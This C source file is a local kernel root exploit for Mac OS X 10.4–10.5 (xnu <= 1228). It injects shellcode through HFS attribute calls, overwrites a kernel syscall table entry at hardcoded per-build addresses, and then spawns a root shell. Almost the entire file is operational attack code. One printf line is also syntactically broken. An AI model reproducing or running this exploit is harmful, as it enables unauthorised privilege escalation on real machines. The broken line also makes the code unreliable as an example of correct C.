/*
 * - Tested on: Apple MACOS X 10.4.8 (xnu-792.14.14.obj~1/RELEASE_I386)
 *              Apple MACOS X 10.4.9 (xnu-792.18.5~1/RELEASE_I386)
 *              Apple MACOS X 10.4.10 (xnu-792.22.5~1/RELEASE_I386)
 *              Apple MACOS X 10.4.11 (xnu-792.25.20~1/RELEASE_I386)
 *              Apple MACOS X 10.5.0 (xnu-1228~1/RELEASE_I386)
 *              Apple MACOS X 10.5.1 (xnu-1228.0.2~1/RELEASE_I386)
 *              Apple MACOS X 10.5.2 (xnu-1228.3.13~1/RELEASE_I386)
 *              Apple MACOS X 10.5.3 (xnu-1228.5.18~1/RELEASE_I386)
 *              Apple MACOS X 10.5.4 (xnu-1228.5.20~1/RELEASE_I386)
 *              Apple MACOS X 10.5.5 (xnu-1228.7.58~1/RELEASE_I386)
 *              Apple MACOS X 10.5.6 (xnu-1228.9.59~1/RELEASE_I386)
 *    - Private Source Code -DO NOT DISTRIBUTE -
 */
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <sys/attr.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <unistd.h>

#define OSX_TIGER           0x04
#define OSX_LEOPARD         0x05

#define HFS_GET_BOOT_INFO   0x00010004
#define SYSCALL_NUM         21
#define TIGER_HIT_ADDY(a)   ((a)+0x20+((sizeof (struct sysent)-sizeof (int))*SYSCALL_NUM))
#define LEOPARD_HIT_ADDY(a) ((a)+0x20+(sizeof (struct sysent)*SYSCALL_NUM))

struct sysent {
  short sy_narg;
  char  sy_resv;
  char  sy_flags;
  void  *sy_call;
  void  *sy_arg_munge32;
  void  *sy_arg_munge64;
  int   sy_return_type;
  short sy_arg_bytes;
};

static unsigned char ztiger[] =
  "\x55"
  "\x89\xe5"
  "\x8b\x45\x08"
  "\x8b\x40\x08"
  "\xc7\x40\x10\x00\x00\x00\x00"
  "\x31\xc0"
  "\xc9"
  "\xc3";

static unsigned char zleopard[] =
  "\x55"
  "\x89\xe5"
  "\x8b\x45\x08"
  "\x8b\x40\x64"
  "\xc7\x40\x10\x00\x00\x00\x00"
  "\x31\xc0"
  "\xc9"
  "\xc3";

static struct targets {
  const char *name;
  int shell_addr;   /* &copyright */
  int sys_addr;     /* &nsysent   */
  const int type;
} targets_t[] = {
  /* tiger */
  { "root:xnu-792.14.14.obj~1/RELEASE_I386", 0x004518ac, 0x00451920, OSX_TIGER },
  { "root:xnu-792.18.15~1/RELEASE_I386", 0x004528ec, 0x00452960, OSX_TIGER },
  { "root:xnu-792.22.5~1/RELEASE_I386", 0x004548ec, 0x00454960, OSX_TIGER },
  { "root:xnu-792.25.20~1/RELEASE_I386", 0x004548ec, 0x00454960, OSX_TIGER },
  /* leopard */
  { "root:xnu-1228~1/RELEASE_I386", 0x0050170c, 0x00501780, OSX_LEOPARD },
  { "root:xnu-1228.0.2~1/RELEASE_I386", 0x0050270c, 0x00502780, OSX_LEOPARD },
  { "root:xnu-1228.3.13~1/RELEASE_I386", 0x0050470c, 0x00504780, OSX_LEOPARD },
  { "root:xnu-1228.5.18~1/RELEASE_I386", 0x0050770c, 0x00507780, OSX_LEOPARD },
  { "root:xnu-1228.5.20~1/RELEASE_I386", 0x0050770c, 0x00507780, OSX_LEOPARD },
  { "root:xnu-1228.7.58~1/RELEASE_I386", 0x0050770c, 0x00507780, OSX_LEOPARD },
  { "root:xnu-1228.9.59~1/RELEASE_I386", 0x0050A70c, 0x0050A780, OSX_LEOPARD },
  { NULL, 0, 0, 0 },
};

int
main (int argc, char **argv) {
  struct utsname p_uname;
  struct sysent fsysent;
  struct attrlist attr;
  char buf_attr[2048], *ptr;
  int shell_addr, sys_addr, sysent_addr;
  int fd, id, i, n, type;

  printf ("Apple MACOS X xnu <= 1228.x local kernel root exploit\n"
  if (argc < 2)
    {
      fprintf (stderr, "Usage: %s <hfs volume>\n", argv[0]);
      exit (EXIT_FAILURE);
    }

  shell_addr = 0;
  sys_addr = 0;
  type = 0;
  uname (&p_uname);
  ptr = strrchr (p_uname.version, ' ') + 1;
  for (i = 0; targets_t[i].name; i++)
    if (strcmp (targets_t[i].name, ptr) == 0)
      {
        shell_addr = targets_t[i].shell_addr;
        sys_addr = targets_t[i].sys_addr;
        type = targets_t[i].type;
        break;
      }
  if (targets_t[i].name == NULL)
    {
      fprintf (stderr, "%s: unsupported xnu version found :( [%s]\n",
               argv[0], ptr);
      exit (EXIT_FAILURE);
    }
  printf ("* getattrlist...");
  fflush (stdout);
  attr.bitmapcount = ATTR_BIT_MAP_COUNT;
  attr.commonattr = ATTR_CMN_FNDRINFO;
  attr.volattr = 0;
  attr.dirattr = 0;
  attr.fileattr = 0;
  attr.forkattr = 0;
  n = getattrlist (argv[1], &attr, (void *) buf_attr, sizeof (buf_attr), 0);
  if (n < 0)
    {
      fprintf (stderr, "\n%s: getattrlist failed\n", argv[0]);
      exit (EXIT_FAILURE);
    }
  printf ("done\n");
  printf ("** attrlist length: %d\n", *(int *) &buf_attr[0]);
  printf ("** fndrinfo: ");
  for (i = 4; i < *(int *) &buf_attr[0]; i++)
    printf ("%c", buf_attr[i]);
  printf ("\n* done\n\n");
  if (type == OSX_TIGER)
    memcpy (&buf_attr[4], ztiger, sizeof (ztiger) - 1);
  else if (type == OSX_LEOPARD)
    memcpy (&buf_attr[4], zleopard, sizeof (zleopard) - 1);
  else
    {
      fprintf (stderr, "\n%s: unknown type!\n", argv[0]);
      exit (EXIT_FAILURE);
    }
  printf ("* setattrlist...");
  fflush (stdout);
  attr.bitmapcount = ATTR_BIT_MAP_COUNT;
  attr.commonattr = ATTR_CMN_FNDRINFO;
  attr.volattr = ATTR_VOL_INFO;
  attr.dirattr = 0;
  attr.fileattr = 0;
  attr.forkattr = 0;
  n = setattrlist (argv[1], &attr, (void *) &buf_attr[4], sizeof (buf_attr) - 4, 0);
  if (n < 0)
    {
      fprintf (stderr, "\n%s: setattrlist failed\n", argv[0]);
      exit (EXIT_FAILURE);
    }
  printf ("done\n");
  sleep (2);
  fd = open (argv[1], O_RDONLY);
  if (fd < 0)
    {
      fprintf (stderr, "%s: open failed\n", argv[0]);
      exit (EXIT_FAILURE);
    }
  printf ("* overwriting @0x%08X\n", shell_addr);
  fflush (stdout);
  n = fcntl (fd, HFS_GET_BOOT_INFO, shell_addr);
  if (n < 0)
    {
      fprintf (stderr, "%s: fcntl failed\n", argv[0]);
      exit (EXIT_FAILURE);
    }
  printf ("* done\n\n");
  fsysent.sy_narg = 1;
  fsysent.sy_resv = 0;
  fsysent.sy_flags = 0;
  fsysent.sy_call = (void *) shell_addr;
  fsysent.sy_arg_munge32 = NULL;
  fsysent.sy_arg_munge64 = NULL;
  fsysent.sy_return_type = 0;
  fsysent.sy_arg_bytes = 4;
  memcpy (&buf_attr[4], &fsysent, sizeof (struct sysent));
  printf ("* setattrlist...");
  fflush (stdout);
  attr.bitmapcount = ATTR_BIT_MAP_COUNT;
  attr.commonattr = ATTR_CMN_FNDRINFO;
  attr.volattr = ATTR_VOL_INFO;
  attr.dirattr = 0;
  attr.fileattr = 0;
  attr.forkattr = 0;
  n = setattrlist (argv[1], &attr, (void *) &buf_attr[4], sizeof (buf_attr) - 4, 0);
  if (n < 0)
    {
      fprintf (stderr, "\n%s: setattrlist failed\n", argv[0]);
      exit (EXIT_FAILURE);
    }
  printf ("done\n");
  sleep (2);
  if (type == OSX_TIGER)
    sysent_addr = TIGER_HIT_ADDY(sys_addr);
  else if (type == OSX_LEOPARD)
    sysent_addr = LEOPARD_HIT_ADDY(sys_addr);
  else
    {
      fprintf (stderr, "\n%s: unknown type!\n", argv[0]);
      exit (EXIT_FAILURE);
    }
  printf ("* overwriting @0x%08X\n", sysent_addr);
  printf ("** sysent[%d].sy_call: 0x%08X\n", SYSCALL_NUM, shell_addr);
  fflush (stdout);
  n = fcntl (fd, HFS_GET_BOOT_INFO, sysent_addr);
  if (n < 0)
    {
      fprintf (stderr, "%s: fcntl failed\n", argv[0]);
      exit (EXIT_FAILURE);
    }
  printf ("* done\n\n");
  printf ("* jumping...");
  sleep (2);
  n = syscall (SYSCALL_NUM, NULL);
  printf ("done\n\n");
  id = getuid ();
  printf ("* getuid(): %d\n", id);
  if (id == 0)
    {
      printf ("+Wh00t\n\n");
      /* exec shell, for some reason execve doesn't work!?$! */
      system ("/bin/bash");
    }
  else
    fprintf (stderr, "%s: failed to obtain root :(\n", argv[0]);
  return (EXIT_SUCCESS);
}
